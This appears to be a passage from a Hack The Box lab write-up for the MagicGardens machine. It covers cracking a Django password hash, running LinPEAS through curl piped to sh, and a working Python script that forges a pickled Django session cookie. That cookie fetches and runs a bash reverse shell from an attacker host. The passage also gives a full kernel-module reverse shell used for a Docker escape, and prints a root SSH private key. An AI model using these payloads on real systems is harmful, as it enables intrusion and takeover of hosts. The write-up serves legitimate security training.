┌──(kali㉿kali)-[/media/…/HTB/Machines/MagicGardens/files]
└─$ cat hash 
pbkdf2_sha256$600000$y1tAjUmiqLtSdpL2wL3h56$61u2yMfK3oYgnL31fX8R4k/0hTc6YXRfiOH4LYVsEXo=
```

And we got lucky on the following one.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/MagicGardens/files]
└─$ hashcat -m 10000 hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-Intel(R) Core(TM) i9-10900 CPU @ 2.80GHz, 2919/5902 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

pbkdf2_sha256$600000$y1tAjUmiqLtSdpL2wL3h56$61u2yMfK3oYgnL31fX8R4k/0hTc6YXRfiOH4LYVsEXo=:jonasbrothers
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10000 (Django (PBKDF2-SHA256))
Hash.Target......: pbkdf2_sha256$600000$y1tAjUmiqLtSdpL2wL3h56$61u2yMf...VsEXo=
Time.Started.....: Sun May 19 11:31:29 2024 (1 min, 50 secs)
Time.Estimated...: Sun May 19 11:33:19 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       28 H/s (7.65ms) @ Accel:256 Loops:128 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3072/14344385 (0.02%)
Rejected.........: 0/3072 (0.00%)
Restore.Point....: 2048/14344385 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:599936-599999
Candidate.Engine.: Device Generator
Candidates.#1....: slimshady -> dangerous
Hardware.Mon.#1..: Util: 95%

Started: Sun May 19 11:31:09 2024
Stopped: Sun May 19 11:33:20 2024
```

| Username | Password      |
| -------- | ------------- |
| morty    | jonasbrothers |

And with the `password` of `morty` we could finally `SSH` into the box.

```c
┌──(kali㉿kali)-[~]
└─$ ssh morty@magicgardens.htb
The authenticity of host 'magicgardens.htb (10.129.11.161)' can't be established.
ED25519 key fingerprint is SHA256:QixQoCpRoi98/2NP9t4cSa8PUu3paHIhrFzgDRKBmlM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'magicgardens.htb' (ED25519) to the list of known hosts.
morty@magicgardens.htb's password: 
Linux magicgardens 6.1.0-20-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.85-1 (2024-04-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
morty@magicgardens:~$
```

## Enumeration

Two quick checks didn't revealed anything new or unexpected as from the reconnaissance before.

```c
morty@magicgardens:~$ id
uid=1001(morty) gid=1001(morty) groups=1001(morty)
```

```c
morty@magicgardens:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:101:109:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
alex:x:1000:1000:alex,,,:/home/alex:/bin/bash
morty:x:1001:1001::/home/morty:/bin/bash
postfix:x:103:113::/var/spool/postfix:/usr/sbin/nologin
_laurel:x:999:997::/var/log/laurel:/bin/false
```

### LinPEAS

To speed things up and to avoid missing anything, we fired up `LinPEAS` to cover 90% of the enumeration tasks and to get a better picture on how to `escalate our privileges` to `alex`.

```c
morty@magicgardens:~$ curl http://10.10.14.76/linpeas.sh | sh
```

First of all we found out that `Firefox` was running with `remote-debugging-port` enabled on the box.

```c
<--- CUT FOR BREVITY --->
_laurel      600  1.5  0.3  16036 12732 ?        R<   May18  19:13  _ /usr/local/sbin/laurel --config /etc/laurel/config.toml
  └─(Caps) 0x0000000000080004=cap_dac_read_search,cap_sys_ptrace
root         838  0.0  0.0   6608  2564 ?        Ss   May18   0:00 /usr/sbin/cron -f
root         847  0.0  0.0   8500  2592 ?        S    May18   0:00  _ /usr/sbin/CRON -f
root         859  0.0  0.0   2576   904 ?        Ss   May18   0:00      _ /bin/sh -c sleep 90; /root/AI/AI.py
root        1929  0.0  0.5  33704 23168 ?        S    May18   0:24          _ /usr/bin/python3 /root/AI/AI.py
root        1930  0.0  0.1   9488  4456 ?        Sl   May18   0:19              _ /root/AI/geckodriver --port 50065 --websocket-port 43805
root        1937  1.8  9.7 11365964 392204 ?     Sl   May18  22:55                  _ firefox-esr --marionette --headless --remote-debugging-port 43805 --remote-allow-hosts localhost -no-remote -profile /tmp/rust_mozprofileZAhVsH
<--- CUT FOR BREVITY --->
```

We also could completed the `initial port scans` by having a look on the `listening ports`. Port `1337/TCP` was pretty unusual but we didn't know what to do with it at this point. Spoiler alert, we didn't knew it until we rooted the box lol.

```c
<--- CUT FOR BREVITY --->
tcp        0      0 127.0.0.1:46649         0.0.0.0:*               LISTEN      -                                                                                                                                                           
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:41545         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:50065         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:43805         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::5000                 :::*                    LISTEN      -                   
tcp6       0      0 :::25                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -
<--- CUT FOR BREVITY --->
```

## Django Administration Panel

Since we were pretty stuck at this point, we headed back to the `Django Administration Panel` we found earlier.

- [http://magicgardens.htb/admin](http://magicgardens.htb/admin)

![](images/2024-05-19_11-49_django.png)

We used the credentials for `morty` to login.

![](images/2024-05-19_11-51_django_login.png)

## Privilege Escalation into Docker Container

Remembering the fact that the application used `Python Pickle` to `serialize` information, we went for a `Deserialization Attack` by replacing the current `cookie` we a new crafted cookie to execute `arbitrary commands`.

![](images/2024-05-19_11-52_django_cookie.png)

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/MagicGardens/files]
└─$ cat cookie.py 
import subprocess
import django
from django.conf import settings
import django.core.signing as signing
import pickle

settings.configure(
    SECRET_KEY='55A6cc8e2b8#ae1662c34)618U549601$7eC3f0@b1e8c2577J22a8f6edcb5c9b80X8f4&87b',
    USE_TZ=True,
)

django.setup()

salt_value = "django.contrib.sessions.backends.signed_cookies"

class PickleHandler:
    def dumps(self, obj):
        return pickle.dumps(obj, pickle.HIGHEST_PROTOCOL)

    def loads(self, data):
        return pickle.loads(data)

class CommandExecutor:
    def __reduce__(self):
        return (subprocess.Popen, (('curl http://10.10.14.76/x|sh',), -1, None, None, None, None, None, False, True))

serialized_command = signing.dumps(
    CommandExecutor(), key=settings.SECRET_KEY, salt=salt_value, serializer=PickleHandler)
print(serialized_command)

```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/MagicGardens/files]
└─$ python3 cookie.py 
gAWVSgAAAAAAAACMCnN1YnByb2Nlc3OUjAVQb3BlbpSTlCiMHGN1cmwgaHR0cDovLzEwLjEwLjE0Ljc2L3h8c2iUhZRK_____05OTk5OiYh0lFKULg:1s984B:U-ytbxl3I70QMPvs_hXMDT0q4iqrVE2DDRmDSxRv4k0
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/MagicGardens/serve]
└─$ cat x
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.14.76/9001 0>&1'
```

We `replaced` the cookie with the new one and `reloaded` the page to immediately got a `callback`.

![](images/2024-05-19_11-56_django_payload_trigger.png)

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/MagicGardens/serve]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.11.161 - - [19/May/2024 11:59:30] "GET /x HTTP/1.1" 200 -
```

```c
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.76] from (UNKNOWN) [10.129.11.161] 51296
bash: cannot set terminal process group (16): Inappropriate ioctl for device
bash: no job control in this shell
root@86197762ad36:/usr/src/app#
```

And we landed as `root` inside a `Docker Container`.

```c
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.76] from (UNKNOWN) [10.129.11.161] 51296
bash: cannot set terminal process group (16): Inappropriate ioctl for device
bash: no job control in this shell
root@86197762ad36:/usr/src/app# id
id
uid=0(root) gid=0(root) groups=0(root)
root@86197762ad36:/usr/src/app#
```

## Privilege Escalation to root

A few things usually got checked in side a container are `capabilities` which we did and found the `cap_sys_module` was enabled.

- [https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd](https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd)
- [https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)

```c
root@86197762ad36:~# capsh --print
capsh --print
Current: cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_audit_write,cap_setfcap=ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_audit_write,cap_setfcap
Ambient set =
Current IAB: !cap_dac_read_search,!cap_linux_immutable,!cap_net_broadcast,!cap_net_admin,!cap_ipc_lock,!cap_ipc_owner,!cap_sys_rawio,!cap_sys_ptrace,!cap_sys_pacct,!cap_sys_admin,!cap_sys_boot,!cap_sys_nice,!cap_sys_resource,!cap_sys_time,!cap_sys_tty_config,!cap_mknod,!cap_lease,!cap_audit_control,!cap_mac_override,!cap_mac_admin,!cap_syslog,!cap_wake_alarm,!cap_block_suspend,!cap_audit_read,!cap_perfmon,!cap_bpf,!cap_checkpoint_restore
Securebits: 00/0x0/1'b0 (no-new-privs=0)
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
 secure-no-ambient-raise: no (unlocked)
uid=0(root) euid=0(root)
gid=0(root)
groups=0(root)
Guessed mode: HYBRID (4)
```

We copied the exploit for the `Loadable Kernel Module (LKM)` and also the `Makefile` to shove it into the container.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/MagicGardens/serve]
└─$ cat reverse-shell.c 
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.76/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/MagicGardens/serve]
└─$ cat Makefile 
obj-m +=reverse-shell.o

all:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
        make -C /lib
```

```c
root@86197762ad36:~# wget http://10.10.14.76/reverse-shell.c    
wget http://10.10.14.76/reverse-shell.c
--2024-05-19 16:08:03--  http://10.10.14.76/reverse-shell.c
Connecting to 10.10.14.76:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 933 [text/x-csrc]
Saving to: ‘reverse-shell.c’

     0K                                                       100% 71.8M=0s

2024-05-19 16:08:03 (71.8 MB/s) - ‘reverse-shell.c’ saved [933/933]
```

Shout-out to `Crow` for not giving a fuck about `tabs`.

```c
root@86197762ad36:~# echo "b2JqLW0gKz1yZXZlcnNlLXNoZWxsLm8KCmFsbDoKCW1ha2UgLUMgL2xpYi9tb2R1bGVzLyQoc2hl
bGwgdW5hbWUgLXIpL2J1aWxkIE09JChQV0QpIG1vZHVsZXMKCmNsZWFuOgoJbWFrZSAtQyAvbGli
<WxsLm8KCmFsbDoKCW1ha2UgLUMgL2xpYi9tb2R1bGVzLyQoc2hlRCkgY2xlYW4K" | base64 -d > Makefile
```

As last step we `compiled` the module and `loaded` it.

```c
root@86197762ad36:~# make
make
make -C /lib/modules/6.1.0-20-amd64/build M=/root modules
make[1]: Entering directory '/usr/src/linux-headers-6.1.0-20-amd64'
  CC [M]  /root/reverse-shell.o
  MODPOST /root/Module.symvers
  CC [M]  /root/reverse-shell.mod.o
  LD [M]  /root/reverse-shell.ko
  BTF [M] /root/reverse-shell.ko
Skipping BTF generation for /root/reverse-shell.ko due to unavailability of vmlinux
make[1]: Leaving directory '/usr/src/linux-headers-6.1.0-20-amd64'
```

```c
root@86197762ad36:~# ls -la
ls -la
total 384
drwx------ 1 root root   4096 May 19 16:17 .
drwxr-xr-x 1 root root   4096 May  9 14:02 ..
-rw-r--r-- 1 root root    147 May 19 16:17 .Module.symvers.cmd
lrwxrwxrwx 1 root root      9 Apr 26 15:09 .bash_history -> /dev/null
-rw-r--r-- 1 root root    571 Apr 10  2021 .bashrc
-rw-r--r-- 1 root root     87 May 19 16:17 .modules.order.cmd
-rw-r--r-- 1 root root    161 Jul  9  2019 .profile
lrwxrwxrwx 1 root root      9 Aug 28  2023 .python_history -> /dev/null
-rw-r--r-- 1 root root    209 May 19 16:17 .reverse-shell.ko.cmd
-rw-r--r-- 1 root root    130 May 19 16:17 .reverse-shell.mod.cmd
-rw-r--r-- 1 root root  54001 May 19 16:17 .reverse-shell.mod.o.cmd
-rw-r--r-- 1 root root  52600 May 19 16:17 .reverse-shell.o.cmd
-rw-r--r-- 1 root root    254 Aug 25  2023 .wget-hsts
-rw-r--r-- 1 root root    162 May 19 16:17 Makefile
-rw-r--r-- 1 root root      0 May 19 16:17 Module.symvers
-rw-r--r-- 1 root root     23 May 19 16:17 modules.order
-rw-r--r-- 1 root root    717 May 19 16:11 reverse-shell.c
-rw-r--r-- 1 root root 109776 May 19 16:17 reverse-shell.ko
-rw-r--r-- 1 root root     22 May 19 16:17 reverse-shell.mod
-rw-r--r-- 1 root root    893 May 19 16:17 reverse-shell.mod.c
-rw-r--r-- 1 root root  93064 May 19 16:17 reverse-shell.mod.o
-rw-r--r-- 1 root root  18080 May 19 16:17 reverse-shell.o
```

```c
root@86197762ad36:~# insmod reverse-shell.ko
insmod reverse-shell.ko
```

```c
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.76] from (UNKNOWN) [10.129.11.161] 43806
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
root@magicgardens:/#
```

## user.txt

```c
root@magicgardens:/# cat /home/alex/user.txt
cat /home/alex/user.txt
cba4e51a66d3b3ae2a365c2bd4a68a7f
```

## root.txt

```c
root@magicgardens:/# cat /root/root.txt
cat /root/root.txt
21bd9753d08f9a476662d9dd8d946bd6
```

## Post Exploitation

```c
root@magicgardens:/root/.ssh# cat id_rsa
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAIEAsyXq6mfyWfzHMRdLtAPytpPckxE8mcuf7Nunf9o+gwQg3h/B9N+L
cWZTlmHCSmvDnFFfH9nTEG7ZGBntVpEAOAuWRYojNAFvYSvrDQMMRO/ErPSEFTmkKQtJdt
ac0Xfs2aGHPpO9JdeNskgC3yQwv+8eLHNqXNTRtzGirD87PbsAAAII1XMGntVzBp4AAAAH
c3NoLXJzYQAAAIEAsyXq6mfyWfzHMRdLtAPytpPckxE8mcuf7Nunf9o+gwQg3h/B9N+LcW
ZTlmHCSmvDnFFfH9nTEG7ZGBntVpEAOAuWRYojNAFvYSvrDQMMRO/ErPSEFTmkKQtJdtac
0Xfs2aGHPpO9JdeNskgC3yQwv+8eLHNqXNTRtzGirD87PbsAAAADAQABAAAAgQCV4gB0E3
mZPjqtYM8ukisMBBOEW+R2y/1GXtP5zO+GD/srvCg7Jph0zObcJ3g1aYnkC9RpQoYq9oLd
fjuqtHAYDVzTDoZHfc3BJC15iw7KoQiOXsrbO8P8aLomYbfiLgPsf0E3aARKjEX44j+ELv
2SPzhL1WHRAfu13Nbvf7ha6QAAAEAK83MYwkGkatXHuVEBjQuVKiJDr1A9IgDoGQ3/WVTu
NNm57te2HnQuqK8CTxMOE6CiPXoEwO4UUgzVOXbNBbieAAAAQQDc6qe4ez2iTRZ0WoEfe9
heXP2ikBgn+JBeSmMYd5EHtMScCmBS06ooqnfAnaP6P2Y0AA4LeWIGYkI/PxyOqgVVAAAA
QQDPmSrwc1bYM6tzvwDS0LYmibNUPpQh/eFPoUTs7AHErvpLve5Grygd38N5zWuKYA2xv9
NZtR9pU8HLUhC8HTbPAAAAEXJvb3RAbWFnaWNnYXJkZW5zAQ==
-----END OPENSSH PRIVATE KEY-----
```
